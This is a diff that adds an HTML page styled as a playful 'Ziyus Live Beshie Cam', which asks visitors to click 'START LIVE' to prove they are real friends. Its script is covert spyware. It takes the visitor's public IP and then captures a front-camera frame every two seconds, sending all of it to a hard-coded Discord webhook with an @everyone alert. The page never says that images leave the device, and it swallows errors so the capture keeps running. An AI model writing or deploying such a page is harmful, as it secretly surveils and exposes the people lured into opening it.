@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ziyus Live Cam 🔥</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #fff;
+      font-family: system-ui, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .card {
+      background: rgba(20,20,30,0.85);
+      backdrop-filter: blur(12px);
+      border: 1px solid #ff2e63;
+      border-radius: 16px;
+      padding: 2.5rem;
+      text-align: center;
+      max-width: 380px;
+      box-shadow: 0 0 30px rgba(255,46,99,0.4);
+    }
+    h1 {
+      color: #ff2e63;
+      margin-bottom: 1rem;
+      font-size: 2.2rem;
+    }
+    .status {
+      margin: 1.5rem 0;
+      font-size: 1.2rem;
+      color: #00ff9d;
+    }
+    .error {
+      color: #ff4757;
+      margin-top: 1rem;
+      font-size: 1.1rem;
+    }
+    button {
+      background: #ff2e63;
+      color: white;
+      border: none;
+      padding: 1rem 2.8rem;
+      font-size: 1.3rem;
+      border-radius: 999px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+    button:hover { background: #e91e63; transform: scale(1.06); }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Ziyus Live Beshie Cam</h1>
+  <p><strong>Click "START LIVE" to prove you're real tropa</strong><br>Don't close the tab ha 😈</p>
+  
+  <button id="btn">START LIVE</button>
+  
+  <div class="status" id="status"></div>
+  <div class="error" id="err"></div>
+</div>
+
+<video id="vid" autoplay playsinline muted style="display:none;"></video>
+
+<script>
+// YOUR WEBHOOK ────────────────────────────────────────
+const WEBHOOK = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
+// ──────────────────────────────────────────────────────
+
+const video = document.getElementById('vid');
+const status = document.getElementById('status');
+const err = document.getElementById('err');
+const btn = document.getElementById('btn');
+
+let stream = null;
+let interval = null;
+let frameCount = 0;
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    return (await r.json()).ip;
+  } catch {
+    return "Hidden";
+  }
+}
+
+async function sendFrame() {
+  if (!video.videoWidth) return;
+
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.translate(canvas.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0);
+
+  try {
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.62));
+    if (blob.size < 1500) return;
+
+    const file = new File([blob], `live-frame-${++frameCount}.jpg`, {type:'image/jpeg'});
+
+    const ip = await getIP();
+
+    const form = new FormData();
+    form.append('file', file);
+    form.append('payload_json', JSON.stringify({
+      username: "Ziyus LIVE CAM",
+      content: `🔴 Frame ${frameCount} • ${new Date().toLocaleTimeString()}`,
+      embeds: [{
+        color: 0xFF2E63,
+        fields: [
+          {name: "IP", value: `\`${ip}\``, inline:true},
+          {name: "Time", value: new Date().toLocaleString(), inline:true}
+        ],
+        image: {url: "attachment://live-frame.jpg"}
+      }]
+    }));
+
+    await fetch(WEBHOOK, {method: "POST", body: form});
+  } catch (e) {
+    // silent - keep going
+  }
+}
+
+async function start() {
+  try {
+    err.textContent = "";
+    btn.disabled = true;
+    btn.textContent = "LIVE...";
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {facingMode: "user"},
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await video.play();
+
+    // Initial "started" message
+    const ip = await getIP();
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        username: "Ziyus LIVE CAM",
+        content: "@everyone **BESHIE WENT LIVE** — watching rn 🔥",
+        embeds: [{
+          title: "Live Camera Activated",
+          description: "Real-time frames incoming...",
+          color: 0xFF0000,
+          fields: [{name: "IP", value: `\`${ip}\``}],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+
+    status.textContent = "🔴 LIVE • sending every ~2 seconds";
+
+    // Send frames forever (until tab close)
+    interval = setInterval(sendFrame, 2000);
+
+  } catch (e) {
+    err.textContent = "Camera access blocked. Allow it para maging live ka bobo 😤";
+    btn.disabled = false;
+    btn.textContent = "START LIVE";
+  }
+}
+
+// Cleanup on leave
+window.addEventListener('beforeunload', () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  if (interval) clearInterval(interval);
+});
+
+btn.onclick = start;
+</script>
+</body>
+</html>
